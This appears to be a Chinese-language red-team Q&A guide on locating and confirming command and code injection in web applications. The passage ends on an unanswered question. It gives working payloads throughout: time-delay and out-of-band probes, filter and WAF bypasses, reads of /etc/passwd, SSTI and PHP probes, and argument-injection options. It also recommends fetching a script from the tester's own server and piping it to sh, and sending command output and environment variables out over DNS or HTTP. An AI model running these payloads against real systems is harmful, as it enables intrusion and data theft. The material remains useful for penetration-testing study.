# Web · 命令注入/代码注入的定位

### 从功能语义先猜"哪里可能拼命令"
**Q1**: 面对一个新 Web 应用,还没发现任何注入点,我该从哪下手判断哪里可能存在命令/代码注入?
**A1**: 先做功能语义画像。凡是"底层要调外部程序或解释器"的功能天然高危:网络诊断(ping/traceroute/nslookup/whois)、文件转换(图片缩略图、pdf 转换、视频转码)、导入导出(备份、tar/zip、excel)、DNS/域名查询、系统信息面板、定时任务/计划、模板渲染/预览、报表生成。把这些功能列成优先级队列,而不是盲目 fuzz 所有参数。
**Q2**: 为什么按功能猜比全参数 fuzz 更高效?
**A2**: 命令注入的本质是"用户输入被拼进 system()/exec()/popen() 这类调用"。只有那些"必须调外部程序才能实现"的功能才会出现这种拼接;纯 CRUD 参数进的是 SQL 或 ORM,fuzz 命令分隔符是浪费。按语义定位能把探测面缩小一个数量级。
**Q3**: 找到高危功能后第一个探针发什么?
**A3**: 发无害的可观测副作用探针:分隔符 + 延时(`;sleep 5`、`|sleep 5`、`` `sleep 5` ``、`$(sleep 5)`)或带外(`;nslookup <唯一子域>.<collab>`)。先看时间差/DNS 命中,而不是急着 `id`——很多点有回显过滤但时间/带外通道是通的。
**Q4**: 这条"按功能猜"的路走完所有高危功能都没反应,怎么办?
**A4**: 转向正交维度——从"参数值"转到"参数外通道"。命令拼接常发生在非表单入口:上传文件名、HTTP header(User-Agent/Referer/X-Forwarded-For 进日志分析或运维脚本)、cookie、XML/JSON 字段名、multipart 边界。把探针从 body 参数转移到这些次要入口重打一遍。
**Q5**: 还是没有,是不是根本没有命令注入?
**A5**: 别急着否定,再转一个正交维度:从"命令注入"转到"代码注入"。同一个模板预览/表达式计算功能,可能不是拼 shell 而是拼进了模板引擎/脚本解释器(SSTI、SpEL、eval)。换用 `{{7*7}}`、`${7*7}`、`#{7*7}` 这类语言层探针再测。

### 命令注入盲测:时间与带外双通道
**Q1**: 我怀疑某参数是命令注入,但页面完全没有命令输出回显,怎么确认?
**A1**: 上盲测双通道。通道一:时间盲注,注入 `sleep`/`ping -c N` 制造可测的延迟,对比注入 5s 与 10s 时响应时间是否线性变化——线性变化才排除网络抖动误报。通道二:带外(OAST),注入 DNS/HTTP 回连到自己的 collaborator,看是否收到解析请求。
**Q2**: 为什么强调"线性变化"而不是单次延迟?
**A2**: 单次延迟可能是服务器负载、网络抖动或本身慢接口造成的假阳性。让 sleep 时间与你设定值成正比(3s→3s、7s→7s),形成因果对应,才是可信判据。这是盲注定位的黄金准则,SQL 时间盲注同理。
**Q3**: Windows 目标没有 sleep 怎么做时间盲注?
**A3**: 换等价延时原语:`ping -n N 127.0.0.1`(每次约 1s)、`timeout /t N`、`for /L`。Linux 上若 sleep 被过滤可用 `ping -c N`、`usleep`、大文件 `md5sum`。定位阶段只求"可测延迟",不求优雅。
**Q4**: 时间盲注和带外都没反应,这条盲测路断了怎么转?
**A4**: 转向"分隔符/上下文"维度——不是通道不通,而是你的注入语法没闭合成功。当前 payload 可能被引号包住或分隔符被过滤。改用多种分隔符矩阵(`;` `|` `||` `&` `&&` `%0a` 换行 `` ` `` `$()`)逐个重打,并尝试前置闭合引号 `'`/`"`。
**Q5**: 带外为什么比时间更优先在生产环境用?
**A5**: 时间盲注每个字符/每次判定都要等待,效率极低且给目标制造负载易被监控;带外是一次请求即拿确定信号,还能顺带外带数据(把命令输出塞进 DNS 子域)。有出网就优先带外,无出网才退回时间盲注。

### 分隔符被过滤:逐个换、再换连接语义
**Q1**: 我确认某点会执行命令,但 `;` 被过滤了,怎么继续?
**A1**: 分隔符是一族而非一个,逐个试:`|`(管道)、`||`(前者失败才执行)、`&`(后台)、`&&`(前者成功才执行)、换行 `%0a`/`%0d`、`$()` 命令替换、反引号、`{cmd,args}`(brace)。每种被 shell 解析的语义不同,过滤器往往只黑了常见的几个。
**Q2**: 分隔符全被过滤,是不是没戏了?
**A2**: 转向"同命令内注入"(argument injection)。即使无法起新命令,你的输入可能作为已有命令的参数拼进去。若后端是 `ping <你的输入>`,试注入额外参数如 `-f`、`--`、或利用该程序自身的危险选项(如 `tar --checkpoint-action=exec`、`find -exec`、`curl -o` 写文件)。定位从"起新进程"转到"劫持现有进程行为"。
**Q3**: argument injection 怎么快速判断有没有希望?
**A3**: 看后端调用的是什么程序。逆推:功能是 ping→目标是 ping,能塞的危险参数有限;功能是"用户传文件名给 tar/zip/convert"→这些程序有 `-I`/`--use-compress-program`/delegate 等能起子进程的选项,危害极大。定位阶段先识别"被拼进的是哪个二进制"。
**Q4**: 怎么识别被拼进的是哪个二进制?
**A4**: 触发报错回显是最快的:传入非法值让程序自己吐 usage/error(如非法路径让 convert 报处理器版本、非法主机让 ping 报特定格式)。报错里的程序名、版本、参数用法直接告诉你注入上下文。
**Q5**: 换行 `%0a` 有时有效有时无效,取决于什么?
**A5**: 取决于输入是否进了 shell 的 `-c` 字符串还是被当单个 argv 传给 execve。若进了 `sh -c "... $input ..."`,换行/分号才有意义;若是 `execve("/bin/ping",["ping",input])` 数组式调用,则任何 shell 元字符都无效,只有 argument injection 有戏。这个区别决定你整条定位策略。

### 空格被过滤:定位是否 shell 上下文
**Q1**: 命令能注入但空格被过滤,`cat /etc/passwd` 打不出去,怎么办?
**A1**: 用无空格替代:`${IFS}`、`$IFS$9`、`{cat,/etc/passwd}`(brace 展开逗号代空格)、`<`/`<>` 重定向(`cat</etc/passwd`)、制表符 `%09`。逐个试,能出结果说明你在 shell 上下文里,只是过滤了字面空格。
**Q2**: 这些替代全失败说明什么?
**A2**: 有两种可能:一是根本不在 shell 上下文(execve 数组式),`${IFS}` 不会被展开;二是过滤更狠(连 `{`/`$` 都拦)。转向判据:先发 `` echo${IFS}a `` 看是否回显 `a`,能则在 shell 内,不能则放弃 shell 元字符路线,转 argument injection。
**Q3**: `${IFS}` 生效但 `/` 也被过滤取不到路径怎么办?
**A3**: 用变量拼接或编码:`cat${IFS}$(echo${IFS}L2V0Yy9wYXNzd2Q=|base64${IFS}-d)`,或用 `cd` 进目录再取相对路径,或用通配符 `/???/passwd`、`/e*c/passwd`。定位阶段确认哪些字符类被黑,列出黑名单再针对性绕。
**Q4**: 这条"字符绕过"路整体被 WAF 秒拦,怎么转正交维度?
**A4**: 转"带外无回显利用"。既然过滤针对的是"读文件+回显"这类明显 payload,改成不落地敏感关键字:注入命令让目标主动连你的服务器下载并执行脚本(`curl <你的IP>|sh` 的等价无空格形式),把复杂逻辑放你自己服务器,注入点只做"最小引爆"。绕过重心从"payload 内容"转到"payload 极简化+外置"。
**Q5**: 为什么外置能绕过很多关键字过滤?
**A5**: WAF 黑名单多针对 payload 里出现的敏感命令(cat/whoami/net user)。若注入点只出现一个下载执行的短链,敏感逻辑在你远端脚本里,WAF 看不到那些关键字,自然拦不住。这是"把复杂度移出检测面"的通用思路。

### 区分命令注入 vs 代码注入
**Q1**: 我发现 `{{7*7}}` 或 `${7*7}` 返回了 49,这是命令注入吗?
**A1**: 不是,这是代码/表达式注入(SSTI 或 EL/OGNL/SpEL),你的输入进了解释器而非 shell。判据:数学表达式被求值(49、`7*7` 变结果)说明是语言层执行,要走该语言的 RCE 链(模板引擎逃逸到 Runtime.exec)而非直接拼 shell。
**Q2**: 怎么快速区分是哪种语言层注入?
**A2**: 用探针指纹:`{{7*7}}` 出 49 多为 Jinja2/Twig 类;`${7*7}` 出 49 多为 FreeMarker/JSP EL/Spring;`#{7*7}` 出 49 偏 Ruby/JSF EL;`<%= 7*7 %>` 偏 ERB/JSP。再用引擎特有 payload 二次确认(如 Jinja 的 `{{7*'7'}}`→7777777,Twig→49)以精确定位引擎版本。
**Q3**: 判定成 SSTI 后,定位工作还没完在哪?
**A3**: 要定位"沙箱强度和可达对象"。同是 SSTI,能否 RCE 取决于引擎沙箱:有的能直接 `config.__class__`,有的要绕 `__builtins__` 限制,FreeMarker/Velocity 常可直达 Execute/Runtime 类。定位阶段先枚举可访问的类/方法,判断到 exec 的距离。
**Q4**: 表达式求值也不通,数学 payload 原样返回,这条代码注入路断了怎么转?
**A4**: 转回命令注入维度。原样返回说明输入没进解释器,可能进了 shell 或 SQL 或就是普通回显。改发 shell 分隔符探针(`;sleep`)和 SQL 探针(`' or sleep(5)-- `)分头验证,别死磕表达式。
**Q5**: `7*7` 返回 49 但也可能是巧合(比如它本就做乘法),如何排除误报?
**A5**: 换随机大数乘积如 `1337*1337` 看是否精确等于 1787569,再叠加字符串运算 `'a'*3`→aaa。多个独立探针都命中语言语义,才排除"接口本身就做数学"的巧合。定位讲究可复现的因果链。

### 无回显无出网(fully blind)的定位
**Q1**: 我强烈怀疑是命令注入,但没回显、时间盲注不稳、带外也收不到(目标不出网),怎么定位?
**A1**: 走"可观测状态变化"通道。命令若执行,可制造应用可感知的副作用:让命令写文件到 web 目录再访问、改变某接口返回、消耗资源触发行为差异、触发错误状态码变化。用布尔盲注思路:`test <条件> && sleep 5` 之外,用"命令成功/失败导致页面差异"作为 1bit 信道。
**Q2**: 目标不出网,时间盲注又慢又不稳,怎么提高可信度?
**A2**: 加大信号幅度并做对照。sleep 从 5s 提到 15-20s 拉开与噪声的距离,连续三次对照(注入长延时/短延时/无延时)取一致性。或用多次并发压测确认延迟随注入线性叠加。定位阶段宁可慢也要确定性。
**Q3**: 能不能把输出落到我能读到的地方?
**A3**: 能则最佳:命令执行结果重定向到 web 可访问路径(`whoami>/var/www/html/x.txt`),再直接 GET 该文件读结果——把盲注变成有回显。前提是定位到 web root 且有写权限。这是无出网环境最实用的"自建回显"手法。
**Q4**: 完全没有任何可观测差异,这条盲注路彻底断了,转哪?
**A4**: 转"入口/漏洞类型"正交维度——很可能它根本不是命令注入。回到定位起点,重新审视:是不是反序列化(发畸形序列化数据看异常栈)、是不是文件上传+解析、是不是 SSRF。别在一个错误假设上耗尽预算,横向换漏洞类别。
**Q5**: 如果确实是注入但环境太封闭无法验证,该记录什么给后续?
**A5**: 记录"疑似点+已排除通道+上下文证据"(报错片段、参数流向、技术栈)。给后续 agent 留下"这里高度疑似 execve 数组式命令注入,shell 元字符无效,建议试 argument injection"这类可执行的转向建议,而非简单标记失败。

### 通过报错信息反推注入上下文
**Q1**: 我在某参数注入特殊字符后页面报错了,这个报错该怎么利用来定位?
**A1**: 报错是定位金矿。看栈/错误文本里出现的关键词:`sh: 1: xxx not found` / `syntax error near unexpected token` → 你在 shell 里且注入生效;`Runtime.exec` / `ProcessBuilder` → Java 命令执行;`preg_replace` / `eval()'d code` → PHP 代码注入;`Template` / `Jinja` / `freemarker` → SSTI。据此锁定注入类型和语言。
**Q2**: `syntax error near unexpected token` 具体说明什么,怎么用?
**A2**: 说明你的元字符已进入 shell 解析器但语法没闭合好。这是"注入确实到达 shell"的强证据,只需修正语法(补引号、换分隔符)即可从报错走向执行。定位上这比沉默失败有价值得多——沉默可能是没到达,报错证明已到达。
**Q3**: 报错被统一成 500 或自定义友好页,拿不到细节怎么办?
**A3**: 转向"差异化盲探"。虽无细节,但"报错 vs 正常"本身是 1bit 信号。构造语法正确 vs 错误的两组 payload,观察状态码/响应长度/响应时间差异,反推解析器行为。也可故意触发不同层的错误(命令层 vs SQL 层 vs 模板层)看哪层先崩,间接定位。
**Q4**: 报错信息误导怎么办(比如看到 SQL 报错就以为是 SQLi,其实是命令注入里调了 mysql 客户端)?
**A4**: 交叉验证,不轻信单一信号。看到 SQL 报错也要试命令分隔符;报错提到的组件名单独去查它是被谁调用的。定位要建立"多条独立证据指向同一结论"再下判断,避免被表层报错锚定。
**Q5**: 报错这条路(诱导报错取信息)被 WAF 拦截或全被吞,转哪?
**A5**: 转"带外外带上下文"。既然本地拿不到报错,让目标把信息发给你:注入命令把 `id`/`uname -a`/环境变量通过 DNS 或 HTTP 带外发出,用外带数据替代本地报错来重建执行上下文。信息获取通道从"响应内"转到"响应外"。

### 判定 Linux 还是 Windows
**Q1**: 确认了命令注入,但要选正确的 payload,怎么先判断是 Linux 还是 Windows?
**A1**: 发跨平台差异探针:同时注入 `sleep 5`(Linux)和 `ping -n 5 127.0.0.1`(Windows),哪个生效即哪个系统。或注入 `&& echo %OS%`(Windows 展开为 Windows_NT)对比 `&& echo $HOME`。用平台特有的展开/命令做判定,别猜。
**Q2**: 分隔符在两个平台通用性如何,会影响判定吗?
**A2**: `&`、`&&`、`|`、`||` 两平台通用;`;` 仅 *nix(cmd.exe 里 `;` 不分隔);换行在 Windows 需 `%0d%0a`。若 `;` 有效基本是 Linux;只有 `&`/`|` 有效则两者皆可能,需靠命令探针进一步区分。
**Q3**: 判成 Windows 后定位重点有何不同?
**A3**: 关注是 cmd 还是 powershell 上下文(影响引号/转义/管道语义),关注是否 IIS/中间件身份运行(决定初始权限),以及路径分隔 `\` 和盘符。Windows 下 `%VAR%` vs PowerShell `$env:VAR` 的展开差异也是进一步定位 shell 类型的探针。
**Q4**: 平台判定探针都被过滤了怎么转?
**A4**: 转"技术栈旁证推断"。从 Server header、错误页风格、路径大小写敏感性(Linux 敏感、Windows 不敏感)、文件扩展名、Cookie 命名等旁证推断 OS,再选对应 payload 试打。判定依据从"直接命令回显"转到"HTTP 层指纹"。
**Q5**: 为什么路径大小写敏感性能当 OS 探针?
**A5**: 访问 `/Index.php` 与 `/index.php`,Linux 严格区分(一个 404 一个 200),Windows/macOS 默认不区分(都 200)。这是不依赖注入点、纯 HTTP 就能获取的 OS 旁证,当注入探针被拦时很有用。

### PHP 代码注入的落点定位
**Q1**: 目标是 PHP,我怀疑是代码注入而非命令注入,常见落点在哪?
**A1**: PHP 代码注入的高危汇聚点:`eval()`、`assert()`(旧版本字符串会执行)、`preg_replace` 带 `/e` 修饰符(PHP<7)、`create_function()`、`call_user_func`/回调可控、`include`/`require` 配合 `data://`/`php://` 伪协议、反序列化 `unserialize()`。定位时看输入是否可能进这些函数。
**Q2**: 怎么探测是否命中 `eval` 类代码注入?
**A2**: 发 PHP 语法探针:`;phpinfo();`、`system('id');`、`${@print(md5(1))}`(看是否回显 md5),或闭合类探针 `');...//`。若返回 phpinfo 或 md5 结果,说明输入进了 PHP 解释器。注意要正确闭合前面的语法(引号、括号、分号)。
**Q3**: PHP 里 `system()`/`exec()`/`` `` ``/`shell_exec` 被 disable_functions 禁用了,还是代码注入吗?
**A3**: 仍是代码注入,只是从"代码→命令"的桥断了。转向绕 disable_functions:LD_PRELOAD 配合 mail/putenv、FFI、imap_open、利用 PHP-FPM/绕过扩展、或纯 PHP 实现的文件/网络操作。定位重点从"能否执行系统命令"转到"代码执行边界内还能做什么"。
**Q4**: 探测代码注入的路全失败,PHP 语法探针原样输出,怎么转?
**A4**: 转命令注入或文件包含维度。原样输出说明没进 eval。改测:输入是否进了 `include`(试 `php://filter/convert.base64-encode/resource=index.php` 读源码)、是否进 shell(命令分隔符)、是否进模板。PHP 应用里 LFI 和命令注入常比 eval 更常见。
**Q5**: 读到源码后如何反哺定位?
**A5**: 白盒审计立刻收窄战场:grep `eval|assert|system|exec|preg_replace.*e|unserialize|include.*\$`,顺着可控变量回溯到入口参数,精确定位注入点和所需闭合语法。从黑盒盲打升级为白盒精确打击,是拿到源码后最高优先级动作。

### 引号闭合与上下文判定
**Q1**: 命令注入探针没反应,我怀疑输入被包在引号里,怎么判断上下文?
**A1**: 上下文决定闭合方式。发探针:直接注入无效时,前置 `'` 或 `"` 尝试闭合。若 `';sleep 5;'` 有效而 `;sleep 5` 无效,说明输入在单引号内,需先闭合单引号。系统性地试:裸注入 / 单引号闭合 / 双引号闭合 / 反引号内,四种上下文覆盖。
**Q2**: 单引号和双引号上下文对 payload 有什么实际影响?
**A2**: 双引号内 `$()`、`` ` ``、`$var` 仍会被 shell 展开,单引号内则全部字面化——所以若在双引号内,`"$(sleep 5)"` 直接生效无需闭合;若在单引号内必须先 `'` 闭合才能注入。判断在哪种引号内,直接决定最短有效 payload。
**Q3**: 怎么用一个探针同时探明引号上下文?
**A3**: 用 `` `sleep 5` `` 或 `$(sleep 5)` 不带闭合先打:生效说明在双引号或裸上下文;不生效再加 `'`/`"` 前缀重打,哪个前缀让 sleep 生效就是哪种引号。逐步逼近,每次只变一个变量,记录哪种组合触发延迟。
**Q4**: 各种引号闭合组合全试遍都无效,转哪个维度?
**A4**: 转"输入根本没进 shell 字符串"的假设——即 execve 数组式调用,无论怎么闭合引号都无 shell 解析。此时放弃引号游戏,转 argument injection(注入以 `-` 开头的参数)或换一个入口/漏洞类型。别在引号上无限排列组合。
**Q5**: 为什么不能无限穷举引号组合?
**A5**: 引号上下文本质只有有限几种(裸/单/双/反引号/嵌套),试完 4-5 种仍无效,继续穷举边际收益趋零,是"这里非 shell 拼接"的强信号。红队要有及时止损、切换假设的纪律,避免在死点耗光时间预算。

### 定位真正的参数落点(参数污染/多参数)
**Q1**: 接口有多个参数,注入探针有反应但我不确定是哪个参数触发的,怎么定位?
**A1**: 逐参数隔离二分。一次只在一个参数放探针(sleep/带外唯一标识),其余置正常值,看哪个触发。参数多时二分:先半数参数带探针,缩小范围。用唯一 collaborator 子域给每个参数编号,一次请求就能区分是谁命中。
**Q2**: 两个参数拼进同一条命令,单独放都不触发但一起放才触发,怎么办?
**A2**: 这是拼接依赖场景——注入点可能横跨参数(前一参数闭合、后一参数注入)。试组合:参数 A 放闭合引号/分隔符,参数 B 放命令。像 `A=x'`、`B=;sleep 5` 这样分工。定位时要考虑命令由多个参数按顺序拼成。
**Q3**: HTTP 参数污染(同名参数多次)会不会影响定位?
**A3**: 会。后端取第一个/最后一个/拼接,行为因框架而异。试 `a=1&a=;sleep5`,若中间件把两个值用逗号拼或取特定一个,可能绕过只校验了第一个值的过滤。定位时把 HPP 当作一种"绕过前置过滤到达注入点"的手段测试。
**Q4**: 所有参数单独和组合都试遍没反应,这条"body 参数"路断了怎么转?
**A4**: 转"非 body 输入源"。把探测从查询/表单参数转向:HTTP header(尤其 UA、XFF、Host、Referer)、Cookie、JSON 嵌套字段、XML 节点、上传文件名/元数据、URL 路径段。命令注入的入口常在开发者认为"不会有恶意输入"的次要通道。
**Q5**: 为什么次要通道反而常中招?
**A5**: 开发者对显式表单参数往往加了过滤,但对 header/文件名/日志字段疏于校验,而这些又常被运维脚本、日志分析、图片处理程序二次消费拼进命令。这类"数据流经过多个环节"的点是命令注入重灾区,定位时要跟踪数据的完整生命周期。

### 上传/解析类触发的命令注入
**Q1**: 目标有图片/文档上传和处理功能,怀疑处理环节命令注入,怎么定位?
**A1**: 处理器是关键。缩略图/转换常调 ImageMagick、GraphicsMagick、ffmpeg、LibreOffice、Ghostscript、exiftool——这些历史上都有解析即执行的漏洞(如 ImageMagick 的 delegate/MSL、Ghostscript 的 -dSAFER 绕过)。先识别处理器与版本,再上对应的畸形文件探针。
**Q2**: 怎么识别后端用的是哪个处理器?
**A2**: 上传后看输出文件的元数据(exif 里常留 Software 字段)、输出格式特征、错误信息、处理耗时特征。或上传各处理器专属的畸形样本,看哪个触发特定报错。识别到具体处理器+版本才能查对应的已知注入向量。
**Q3**: 文件内容注入不行,试文件名注入吗?
**A3**: 试。若后端把文件名拼进命令(`convert <文件名> out.png`),文件名里的 `;`/`$()`/`|` 可能注入。上传名为 `x;sleep5.jpg` 或 `$(sleep 5).jpg` 的文件观察延迟。文件名注入常被忽视但极有效,尤其运维/备份脚本处理上传目录时。
**Q4**: 处理器识别不出、畸形文件和文件名都不触发,转哪?
**A4**: 转"存储型/二阶触发"维度。上传的文件可能不在上传瞬间处理,而是被定时任务、管理员预览、另一接口二次消费时才拼进命令。埋好带外探针的文件后,转去触发其他功能(后台预览、导出、扫描),或等待延时触发,监控 collaborator。
**Q5**: 为什么二阶触发容易被漏判?
**A5**: 上传响应立即返回成功,注入的执行发生在别的时间/别的进程,请求-响应无法直接关联。定位盲测这类点必须用"持久带外信标"(唯一子域)而非同步时间盲注,并主动去触发可能的消费方,把时间维度纳入定位。

### Node.js 代码注入落点
**Q1**: 目标是 Node.js/Express,怀疑代码注入,落点在哪?
**A1**: Node 的危险汇聚:`child_process` 的 exec/execSync(拼 shell)、`eval`/`Function()`、`vm`/`vm2` 沙箱(vm2 有多个逃逸 CVE)、模板引擎(pug/ejs/handlebars 的 SSTI)、`require` 可控、原型链污染间接导致 RCE。先看是命令层(child_process.exec)还是代码层(eval/vm)。
**Q2**: 怎么区分是 child_process.exec 还是纯 JS eval?
**A2**: exec 走 `/bin/sh -c`,shell 元字符(`;`、`$()`)有效;eval 是 JS 求值,`7*7`→49、`process.mainModule` 可达而 shell 元字符无意义。发 `require('child_process').execSync('id')` 类探针看是否 JS 层,发 `;id` 看是否 shell 层,分头判定。
**Q3**: 判成 SSTI(如 pug/handlebars),定位 RCE 路径要注意什么?
**A3**: Node SSTI 到 RCE 常经 `global.process.mainModule.require('child_process')`。不同引擎逃逸语法不同,handlebars 要构造 helper 调用链,pug 可内联 JS。定位阶段先确认能否触达 `process`/`global`/`require` 这几个关键对象,它们是通往 RCE 的枢纽。
**Q4**: 怀疑原型链污染但直接 RCE 探针无效,怎么转?
**A4**: 原型链污染多是二阶/间接的:先污染 `__proto__` 某属性,再靠另一处对该属性的危险使用(如拼进命令、影响模板编译选项)引爆。转向"两步定位":第一步验证污染是否成功(污染一个探测属性看全局是否变),第二步寻找 gadget(消费被污染属性的危险点)。
**Q5**: Node 代码注入所有探针都无效,彻底转向?
**A5**: 转 API 层其他漏洞:Node 应用 RCE 未果时,SSRF、NoSQL 注入(`$where`/`$gt`)、JWT 弱密钥、依赖漏洞往往是更现实的突破口。别把 Node=一定有 RCE,横向评估攻击面性价比,把预算投向证据更强的方向。

### Python 代码注入落点
**Q1**: 目标是 Python 应用,怀疑代码注入,危险汇聚点有哪些?
**A1**: `eval`/`exec`/`compile` 直接执行、`pickle`/`yaml.load`(非 safe_load)反序列化、`subprocess`/`os.system`/`os.popen`(命令层)、`str.format`/f-string 用户可控(格式化串注入泄露对象)、Jinja2 SSTI、`__import__`。先判断输入进了解释器(eval/exec)、序列化器(pickle)还是 shell(subprocess)。
**Q2**: 怎么探测 Python eval/exec 注入?
**A2**: 发 `__import__('os').system('sleep 5')` 或表达式 `7*7`、`().__class__.__bases__` 类探针。Jinja2 SSTI 则用 `{{7*7}}`、`{{''.__class__.__mro__}}`。若返回对象结构或延迟,确认进了 Python 层。注意 Python3 里很多老 payload(如 `__subclasses__` 索引)因版本而异。
**Q3**: 判成 Jinja2 SSTI 但 `__builtins__` 被限制,怎么定位可用链?
**A3**: 枚举可达对象找 gadget:从 `''.__class__` 或 `request`/`config` 出发遍历 `__mro__`/`__subclasses__`,找能触达 `os`/`subprocess`/`__import__` 的类(如 `subprocess.Popen`、warnings 相关类)。定位工作是"在受限沙箱里搜索一条到命令执行的对象链",这本身是核心难点。
**Q4**: `str.format` 注入怎么定位,它能 RCE 吗?
**A4**: 用户控制格式串(`"{0.__class__}".format(obj)`)通常只能读属性/泄露敏感对象(如 config、secret),难直接 RCE 但能信息泄露辅助后续。定位判据:注入 `{0}`/`{user.__class__}` 看是否泄露对象。它是信息泄露型,定位时归到"辅助"而非"直接 RCE"。
**Q5**: Python 代码注入路全断,转哪?
**A5**: 转反序列化维度:Python 应用若有 pickle/PyYAML/自定义序列化(session、缓存、消息队列),发畸形序列化数据观察异常,常比 eval 更易达成 RCE。或转 SSTI 之外的模板/SQL/SSRF。定位重心从"表达式执行"转到"对象反序列化"。

### 编码层绕过定位
**Q1**: 命令注入探针都被 WAF 拦,我怀疑是编码层没绕过,怎么定位有效编码?
**A1**: 系统试编码层:URL 编码(`%3B`=;)、双 URL 编码(`%253B`,当有多层解码时)、Unicode/overlong、大小写混合、HTML 实体、base64 配合解码命令。关键是判断"解码发生在过滤前还是过滤后":若应用先解码再过滤,编码没用;若先过滤再解码,编码能绕。
**Q2**: 怎么判断解码与过滤的先后顺序?
**A2**: 发单编码探针看是否被拦:若 `%3Bsleep5` 被拦=先解码后过滤(编码无效,得换绕法);若 `%3B` 通过但被当字面=没解码;若双编码 `%253B` 通过且生效=存在多层解码,你命中了"过滤在第一层、解码在第二层"的窗口。用不同编码层数逐一探测这个窗口。
**Q3**: 命令本身的关键字(sleep/curl)被拦,编码命令内容行吗?
**A3**: 行,但要在 shell 能还原的编码上做:`$(echo c2xlZXAgNQ==|base64 -d)`、`$'\x73\x6c\x65\x65\x70'`、变量拼接 `s""leep`/`sle\ep`(shell 里引号/反斜杠可打断关键字匹配而不影响执行)。定位是"找一种 WAF 看不出但 shell 认得的等价写法"。
**Q4**: 所有编码/变形都被拦,这条绕 WAF 路断了怎么转?
**A4**: 转"改变检测面"而非继续变形 payload。手段:换请求方法(GET→POST/PUT)、换 Content-Type(表单→JSON→XML,WAF 对不同解析深度不一)、参数放不同位置(body→header→multipart)、分块传输、超长填充撑爆 WAF 检测缓冲。让 payload 到达一个 WAF 检测较弱的入口。
**Q5**: 换检测面也不行,还有什么正交思路?
**A5**: 转"极简 payload + 外置逻辑":WAF 拦的是可识别的攻击特征,把注入点缩到最短(仅一个下载执行或一次带外),复杂逻辑全放你自己服务器。特征越少越难匹配。若连极简都拦,才考虑这个入口确无戏,转别的漏洞类型。

### 客户端过滤 vs 服务端过滤
**Q1**: 表单对我的注入 payload 报"非法字符",我怎么判断是前端拦还是后端拦?
**A1**: 绕过前端直发。用代理(Burp)拦截请求,或直接构造原始 HTTP 请求发送,跳过 JS/HTML5 校验。若绕过前端后 payload 生效=纯客户端过滤(形同虚设);若仍被拦=服务端也有校验。先分清这个,能省大量无用功。
**Q2**: 前端有 maxlength/正则,后端没校验的情况常见吗?
**A2**: 相当常见,尤其内部系统和快速开发的应用。开发者以为前端限制就够了。所以定位命令注入时,第一步永远是"脱离浏览器直发原始请求",很多"看起来防住了"的点其实后端裸奔。
**Q3**: 确认服务端也过滤后,怎么定位过滤规则的形状?
**A3**: 二分探测黑名单:逐字符/逐关键字发单字符探针,记录哪些被拦哪些通过,画出黑名单地图(拦 `;|&` 但不拦 `%0a`?拦 `sleep` 但不拦 `ping`?)。知道规则形状才能精准绕,而不是盲目撞。
**Q4**: 服务端过滤是白名单(只允许特定字符集)导致无法注入,转哪?
**A4**: 白名单比黑名单难绕得多。转向:找该参数是否有兄弟接口/旧版本 API 用了弱校验、找同一功能的不同入口(移动端 API 常校验更松)、或彻底换漏洞类型。白名单严格时,横向找"同一后端逻辑的另一个更松入口"往往比硬绕更快。
**Q5**: 为什么"同后端不同入口"值得优先试?
**A5**: 后端命令拼接逻辑常被 web/API/移动端/内部管理端多处复用,但各入口的输入校验由不同开发者/不同时期实现,松紧不一。定位到"薄弱入口打到同一危险汇聚点"是绕过强校验的高效正交思路,比死磕单一入口划算。

### argument injection:分隔符全灭时的最后手段
**Q1**: 所有命令分隔符和 shell 元字符都被过滤/无效,但我确信输入进了某个命令,还能打吗?
**A1**: 能,走 argument injection。即使不能起新命令,你的输入作为参数拼给已有程序,若输入能以 `-`/`--` 开头,可注入该程序的危险选项。关键是识别"被拼进的是哪个二进制"以及"它有哪些能扩大影响的选项"。
**Q2**: 哪些常见程序的参数注入危害大?
**A2**: 举例(占位程序):`tar` 的 `--checkpoint`/`--to-command`、`find` 的 `-exec`、`zip` 的 `-T -TT`、`curl`/`wget` 的 `-o`(写任意文件)、`git` 外部命令、`ssh`/`rsync` 的 `-e`、`sed`/`awk`/`env`/`perl` 的 -e。识别到目标调这类程序,argument injection 就能变相 RCE 或任意文件读写。
**Q3**: 怎么确认输入的位置允许注入参数(是否在选项位)?
**A3**: 看输入在命令行的位置:若是 `program <你的输入> fixed.txt`,输入在前可注入选项;若是 `program fixed <你的输入>`,可能在操作数位,试 `--` 后的选项或换 `-flag=value` 形式。用触发 usage 报错的方式确认参数被程序解析而非被当纯数据。
**Q4**: 目标程序没有可利用的危险选项,argument injection 也走不通,转哪?
**A4**: 转"目标程序本身的解析漏洞"或"换掉这个功能"。前者:该程序历史 CVE(如某解析器 RCE);后者:承认这个注入点利用价值低,转去找应用里其他更易 RCE 的功能。定位不是执念于单点,而是评估每个点的可达性,把力气花在能出货的点。
**Q5**: 为什么 argument injection 常被防御者和攻击者双双忽视?
**A5**: 因为它不需要 shell 元字符,过滤 `;|&$` 的防护完全拦不住;而攻击者习惯了"没分隔符=没戏"就放弃。识别 execve 数组式调用后转 argument injection,是命令注入定位里区分新手和老手的关键判断,遇到"分隔符全灭但确进了命令"务必想到它。

### 二次/延迟注入的定位
**Q1**: 我提交的 payload 当场没反应,但怀疑它会在别处被执行,怎么定位这种二阶命令注入?
**A1**: 用持久带外信标而非同步探针。给每次提交埋唯一标识的 DNS/HTTP 回连(`;curl <唯一ID>.<collab>`),然后主动去触发可能的消费点:后台管理页、报表生成、定时任务、日志分析、导出功能。监控 collaborator,哪个信标何时命中,反推是哪个数据在哪被执行。
**Q2**: 我怎么知道该去触发哪些消费点?
**A2**: 跟踪数据流。你提交的数据会存到哪(数据库、日志、文件),谁会读它(管理后台展示、统计脚本、备份、邮件通知)。凡是"存储的用户数据被再次拼进命令/模板"的环节都是二阶注入点。列出所有"回显你数据"的地方逐一带信标测试。
**Q3**: 埋了信标但一直不触发,是没漏洞还是没触发到?
**A3**: 先排除"没触发到"。很多二阶点靠定时任务或管理员手动操作触发,你需要等待(保持信标监控数小时)或想办法诱导(如构造需要管理员查看的内容)。定位这类点时间维度是变量,不能因为几分钟没反应就否定。
**Q4**: 长时间无触发,这条二阶路难验证,转哪个正交维度?
**A4**: 转一阶可验证的攻击面,把二阶点标记为"疑似待触发"挂起。红队在时间受限时,应优先打确定性高、可同步验证的点;把需要等待/需要特定人操作的二阶点作为背景任务(留信标)并转向其他突破口,而非阻塞在此。
**Q5**: 二阶注入成功触发后,怎么把它变成稳定利用?
